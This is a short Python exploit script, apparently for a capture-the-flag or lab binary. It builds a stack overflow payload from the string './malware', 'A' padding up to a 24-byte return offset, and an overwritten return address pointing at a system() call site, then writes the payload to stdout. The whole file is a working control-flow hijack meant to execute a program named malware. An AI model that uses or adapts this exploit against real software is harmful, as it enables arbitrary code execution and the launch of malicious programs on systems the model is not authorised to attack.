import sys

SYSTEM_CALL_SITE = 0x401A6B
RET_OFFSET = 24
MAX_PAYLOAD = 47

payload = b"./malware\x00"
payload += b"A" * (RET_OFFSET - len(payload))
payload += SYSTEM_CALL_SITE.to_bytes(8, "little")

sys.stdout.buffer.write(payload)



